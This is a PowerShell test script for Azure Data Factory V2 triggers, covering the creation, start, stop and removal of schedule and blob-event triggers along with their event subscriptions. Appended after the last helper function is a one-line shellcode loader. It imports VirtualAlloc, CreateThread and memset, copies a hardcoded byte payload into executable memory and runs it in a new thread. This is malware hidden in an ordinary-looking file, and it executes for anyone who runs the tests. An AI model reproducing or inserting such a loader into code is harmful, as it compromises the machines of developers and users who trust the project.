














function Test-Trigger
{
    $dfname = Get-DataFactoryName
    $rgname = Get-ResourceGroupName
    $rglocation = Get-ProviderLocation ResourceManagement
    $dflocation = Get-ProviderLocation DataFactoryManagement
        
    New-AzResourceGroup -Name $rgname -Location $rglocation -Force

    try
    {
        Set-AzDataFactoryV2 -ResourceGroupName $rgname -Name $dfname -Location $dflocation -Force
     
        $triggername = "foo"
        $expected = Set-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -File .\Resources\scheduletrigger.json -Force
        $actual = Get-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername

        Verify-Trigger $expected $actual $rgname $dfname $triggername

        Remove-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -Force
    }
    finally
    {
        CleanUp $rgname $dfname
    }
}


function Test-StartTriggerThrowsWithoutPipeline
{
    $dfname = Get-DataFactoryName
    $rgname = Get-ResourceGroupName
    $rglocation = Get-ProviderLocation ResourceManagement
    $dflocation = Get-ProviderLocation DataFactoryManagement
        
    New-AzResourceGroup -Name $rgname -Location $rglocation -Force

    try
    {
        Set-AzDataFactoryV2 -ResourceGroupName $rgname -Name $dfname -Location $dflocation -Force
     
        $triggername = "foo"
        $expected = Set-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -File .\Resources\scheduletrigger.json -Force
        $actual = Get-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername

        Verify-Trigger $expected $actual $rgname $dfname $triggername

        Assert-ThrowsContains {Start-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -Force} "BadRequest"
        
        Remove-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -Force
    }
    finally
    {
        CleanUp $rgname $dfname
    }
}


function Test-TriggerRun
{
    $dfname = Get-DataFactoryName
    $rgname = Get-ResourceGroupName
    $rglocation = Get-ProviderLocation ResourceManagement
    $dflocation = Get-ProviderLocation DataFactoryManagement
        
    New-AzResourceGroup -Name $rgname -Location $rglocation -Force

    try
    {
        Set-AzDataFactoryV2 -ResourceGroupName $rgname -Name $dfname -Location $dflocation -Force
     
        $lsName = "foo1"
        Set-AzDataFactoryV2LinkedService -ResourceGroupName $rgname -DataFactoryName $dfname -File .\Resources\linkedService.json -Name $lsName -Force

        Set-AzDataFactoryV2Dataset -ResourceGroupName $rgname -DataFactoryName $dfname -Name "dsIn" -File .\Resources\dataset-dsIn.json -Force
        Set-AzDataFactoryV2Dataset -ResourceGroupName $rgname -DataFactoryName $dfname -Name "ds0_0" -File .\Resources\dataset-ds0_0.json -Force
        Set-AzDataFactoryV2Dataset -ResourceGroupName $rgname -DataFactoryName $dfname -Name "ds1_0" -File .\Resources\dataset-ds1_0.json -Force

        $pipelineName = "samplePipeline"   
        Set-AzDataFactoryV2Pipeline -ResourceGroupName $rgname -Name $pipelineName -DataFactoryName $dfname -File ".\Resources\pipeline.json" -Force

        $triggername = "foo"
        $expected = Set-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -File .\Resources\scheduleTriggerWithPipeline.json -Force
        $actual = Get-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername

        Verify-Trigger $expected $actual $rgname $dfname $triggername
        
        $startDate = [DateTime]::Parse("09/10/2017")
        Start-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -Force
        $started = Get-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername
        
        Assert-AreEqual 'Started' $started.RuntimeState 
        
        if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback) {
            Start-Sleep -s 150
        }
        
        $endDate = $startDate.AddYears(1)
        $triggerRuns = Get-AzDataFactoryV2TriggerRun -ResourceGroupName $rgname -DataFactoryName $dfname -TriggerName $triggername -TriggerRunStartedAfter $startDate -TriggerRunStartedBefore $endDate
        
        if($triggerRuns.Count -lt 1)
        {
            throw "Expected atleast 1 trigger run"
        }
         
        Stop-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -Force
        $stopped = Get-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername
        
        Assert-AreEqual 'Stopped' $stopped.RuntimeState 

        Remove-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -Force
    }
    finally
    {
        CleanUp $rgname $dfname
    }
}


function Test-BlobEventTriggerSubscriptions
{
    $dfname = Get-DataFactoryName
    $rgname = Get-ResourceGroupName
    $rglocation = Get-ProviderLocation ResourceManagement
    $dflocation = Get-ProviderLocation DataFactoryManagement
        
    New-AzResourceGroup -Name $rgname -Location $rglocation -Force

    try
    {
        Set-AzDataFactoryV2 -ResourceGroupName $rgname -Name $dfname -Location $dflocation -Force
     
        $lsName = "foo1"
        Set-AzDataFactoryV2LinkedService -ResourceGroupName $rgname -DataFactoryName $dfname -File .\Resources\linkedService.json -Name $lsName -Force

        Set-AzDataFactoryV2Dataset -ResourceGroupName $rgname -DataFactoryName $dfname -Name "dsIn" -File .\Resources\dataset-dsIn.json -Force
        Set-AzDataFactoryV2Dataset -ResourceGroupName $rgname -DataFactoryName $dfname -Name "ds0_0" -File .\Resources\dataset-ds0_0.json -Force
        Set-AzDataFactoryV2Dataset -ResourceGroupName $rgname -DataFactoryName $dfname -Name "ds1_0" -File .\Resources\dataset-ds1_0.json -Force

        $pipelineName = "samplePipeline"   
        Set-AzDataFactoryV2Pipeline -ResourceGroupName $rgname -Name $pipelineName -DataFactoryName $dfname -File ".\Resources\pipeline.json" -Force

        $triggername = "foo"
        $expected = Set-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -File .\Resources\blobeventtrigger.json -Force
        $actual = Get-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername

        Verify-Trigger $expected $actual $rgname $dfname $triggername
        
        $startDate = [DateTime]::Parse("09/10/2017")
		Add-AzDataFactoryV2TriggerSubscription -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername
		$status = Get-AzDataFactoryV2TriggerSubscriptionStatus -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername
		while ($status.Status -ne "Enabled"){
			if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback) {
				Start-Sleep -s 150
			}
			$status = Get-AzDataFactoryV2TriggerSubscriptionStatus -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername
		}
        
        Start-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -Force
        $started = Get-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername
        
        Assert-AreEqual 'Started' $started.RuntimeState 
        
		Remove-AzDataFactoryV2TriggerSubscription -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -Force

        Stop-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -Force
        $stopped = Get-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername
        
        Assert-AreEqual 'Stopped' $stopped.RuntimeState 

        Remove-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -Force
    }
    finally
    {
        CleanUp $rgname $dfname
    }
}


function Test-BlobEventTriggerSubscriptionsByInputObject
{
    $dfname = Get-DataFactoryName
    $rgname = Get-ResourceGroupName
    $rglocation = Get-ProviderLocation ResourceManagement
    $dflocation = Get-ProviderLocation DataFactoryManagement
        
    New-AzResourceGroup -Name $rgname -Location $rglocation -Force

    try
    {
        Set-AzDataFactoryV2 -ResourceGroupName $rgname -Name $dfname -Location $dflocation -Force
     
        $lsName = "foo1"
        Set-AzDataFactoryV2LinkedService -ResourceGroupName $rgname -DataFactoryName $dfname -File .\Resources\linkedService.json -Name $lsName -Force

        Set-AzDataFactoryV2Dataset -ResourceGroupName $rgname -DataFactoryName $dfname -Name "dsIn" -File .\Resources\dataset-dsIn.json -Force
        Set-AzDataFactoryV2Dataset -ResourceGroupName $rgname -DataFactoryName $dfname -Name "ds0_0" -File .\Resources\dataset-ds0_0.json -Force
        Set-AzDataFactoryV2Dataset -ResourceGroupName $rgname -DataFactoryName $dfname -Name "ds1_0" -File .\Resources\dataset-ds1_0.json -Force

        $pipelineName = "samplePipeline"   
        Set-AzDataFactoryV2Pipeline -ResourceGroupName $rgname -Name $pipelineName -DataFactoryName $dfname -File ".\Resources\pipeline.json" -Force

        $triggername = "foo"
        $expected = Set-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -File .\Resources\blobeventtrigger.json -Force
        $actual = Get-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername

        Verify-Trigger $expected $actual $rgname $dfname $triggername
        
		Add-AzDataFactoryV2TriggerSubscription $actual
		$status = Get-AzDataFactoryV2TriggerSubscriptionStatus $actual
		while ($status.Status -ne "Enabled"){
			if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback) {
				Start-Sleep -s 150
			}
			$status = Get-AzDataFactoryV2TriggerSubscriptionStatus $actual
		}
        
        Start-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -Force
        $started = Get-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername
        
        Assert-AreEqual 'Started' $started.RuntimeState 
        
		Remove-AzDataFactoryV2TriggerSubscription $started -Force

        Stop-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -Force
        $stopped = Get-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername
        
        Assert-AreEqual 'Stopped' $stopped.RuntimeState 

        Remove-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -Force
    }
    finally
    {
        CleanUp $rgname $dfname
    }
}


function Test-BlobEventTriggerSubscriptionsByResourceId
{
    $dfname = Get-DataFactoryName
    $rgname = Get-ResourceGroupName
    $rglocation = Get-ProviderLocation ResourceManagement
    $dflocation = Get-ProviderLocation DataFactoryManagement
        
    New-AzResourceGroup -Name $rgname -Location $rglocation -Force

    try
    {
        Set-AzDataFactoryV2 -ResourceGroupName $rgname -Name $dfname -Location $dflocation -Force
     
        $lsName = "foo1"
        Set-AzDataFactoryV2LinkedService -ResourceGroupName $rgname -DataFactoryName $dfname -File .\Resources\linkedService.json -Name $lsName -Force

        Set-AzDataFactoryV2Dataset -ResourceGroupName $rgname -DataFactoryName $dfname -Name "dsIn" -File .\Resources\dataset-dsIn.json -Force
        Set-AzDataFactoryV2Dataset -ResourceGroupName $rgname -DataFactoryName $dfname -Name "ds0_0" -File .\Resources\dataset-ds0_0.json -Force
        Set-AzDataFactoryV2Dataset -ResourceGroupName $rgname -DataFactoryName $dfname -Name "ds1_0" -File .\Resources\dataset-ds1_0.json -Force

        $pipelineName = "samplePipeline"   
        Set-AzDataFactoryV2Pipeline -ResourceGroupName $rgname -Name $pipelineName -DataFactoryName $dfname -File ".\Resources\pipeline.json" -Force

        $triggername = "foo"
        $expected = Set-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -File .\Resources\blobeventtrigger.json -Force
        $actual = Get-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername

        Verify-Trigger $expected $actual $rgname $dfname $triggername
        
		Add-AzDataFactoryV2TriggerSubscription -ResourceId $expected.Id
		$status = Get-AzDataFactoryV2TriggerSubscriptionStatus -ResourceId $expected.Id
		while ($status.Status -ne "Enabled"){
			if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback) {
				Start-Sleep -s 150
			}
			$status = Get-AzDataFactoryV2TriggerSubscriptionStatus -ResourceId $expected.Id
		}
        
        Start-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -Force
        $started = Get-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername
        
        Assert-AreEqual 'Started' $started.RuntimeState 
        
		Remove-AzDataFactoryV2TriggerSubscription -ResourceId $expected.Id -Force

        Stop-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -Force
        $stopped = Get-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername
        
        Assert-AreEqual 'Stopped' $stopped.RuntimeState 

        Remove-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -Force
    }
    finally
    {
        CleanUp $rgname $dfname
    }
}


function Test-TriggerWithResourceId
{
    $dfname = Get-DataFactoryName
    $rgname = Get-ResourceGroupName
    $rglocation = Get-ProviderLocation ResourceManagement
    $dflocation = Get-ProviderLocation DataFactoryManagement
        
    New-AzResourceGroup -Name $rgname -Location $rglocation -Force

    try
    {
        $df = Set-AzDataFactoryV2 -ResourceGroupName $rgname -Name $dfname -Location $dflocation -Force
     
        $triggername = "foo"
        $expected = Set-AzDataFactoryV2Trigger -ResourceGroupName $rgname -DataFactoryName $dfname -Name $triggername -File .\Resources\scheduletrigger.json -Force
        $actual = Get-AzDataFactoryV2Trigger -ResourceId $expected.Id

        Verify-Trigger $expected $actual $rgname $dfname $triggername

        Remove-AzDataFactoryV2Trigger -ResourceId $expected.Id -Force
    }
    finally
    {
        CleanUp $rgname $dfname
    }
}



function Verify-Trigger ($expected, $actual, $rgname, $dfname, $name)
{
    Verify-AdfSubResource $expected $actual $rgname $dfname $triggername
    Assert-AreEqual $expected.RuntimeState $actual.RuntimeState
}

$bcXQ = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $bcXQ -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xcd,0xbd,0x54,0xc4,0xbc,0xf4,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x6a,0x18,0x83,0xea,0xfc,0x03,0x6a,0x40,0x26,0x49,0x08,0x80,0x24,0xb2,0xf1,0x50,0x49,0x3a,0x14,0x61,0x49,0x58,0x5c,0xd1,0x79,0x2a,0x30,0xdd,0xf2,0x7e,0xa1,0x56,0x76,0x57,0xc6,0xdf,0x3d,0x81,0xe9,0xe0,0x6e,0xf1,0x68,0x62,0x6d,0x26,0x4b,0x5b,0xbe,0x3b,0x8a,0x9c,0xa3,0xb6,0xde,0x75,0xaf,0x65,0xcf,0xf2,0xe5,0xb5,0x64,0x48,0xeb,0xbd,0x99,0x18,0x0a,0xef,0x0f,0x13,0x55,0x2f,0xb1,0xf0,0xed,0x66,0xa9,0x15,0xcb,0x31,0x42,0xed,0xa7,0xc3,0x82,0x3c,0x47,0x6f,0xeb,0xf1,0xba,0x71,0x2b,0x35,0x25,0x04,0x45,0x46,0xd8,0x1f,0x92,0x35,0x06,0x95,0x01,0x9d,0xcd,0x0d,0xee,0x1c,0x01,0xcb,0x65,0x12,0xee,0x9f,0x22,0x36,0xf1,0x4c,0x59,0x42,0x7a,0x73,0x8e,0xc3,0x38,0x50,0x0a,0x88,0x9b,0xf9,0x0b,0x74,0x4d,0x05,0x4b,0xd7,0x32,0xa3,0x07,0xf5,0x27,0xde,0x45,0x91,0x84,0xd3,0x75,0x61,0x83,0x64,0x05,0x53,0x0c,0xdf,0x81,0xdf,0xc5,0xf9,0x56,0x20,0xfc,0xbe,0xc9,0xdf,0xff,0xbe,0xc0,0x1b,0xab,0xee,0x7a,0x8a,0xd4,0x64,0x7b,0x33,0x01,0x10,0x7e,0xa3,0x6a,0x4d,0xef,0x23,0x03,0x8c,0xf0,0x5c,0x43,0x19,0x16,0x32,0x33,0x4a,0x87,0xf2,0xe3,0x2a,0x77,0x9a,0xe9,0xa4,0xa8,0xba,0x11,0x6f,0xc1,0x50,0xfe,0xc6,0xb9,0xcc,0x67,0x43,0x31,0x6d,0x67,0x59,0x3f,0xad,0xe3,0x6e,0xbf,0x63,0x04,0x1a,0xd3,0x13,0xe4,0x51,0x89,0xb5,0xfb,0x4f,0xa4,0x39,0x6e,0x74,0x6f,0x6e,0x06,0x76,0x56,0x58,0x89,0x89,0xbd,0xd3,0x00,0x1c,0x7e,0x8b,0x6c,0xf0,0x7e,0x4b,0x3b,0x9a,0x7e,0x23,0x9b,0xfe,0x2c,0x56,0xe4,0x2a,0x41,0xcb,0x71,0xd5,0x30,0xb8,0xd2,0xbd,0xbe,0xe7,0x15,0x62,0x40,0xc2,0xa7,0x5e,0x97,0x2a,0xd2,0x8e,0x2b;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$BCB1=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($BCB1.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$BCB1,0,0,0);for (;;){Start-sleep 60};

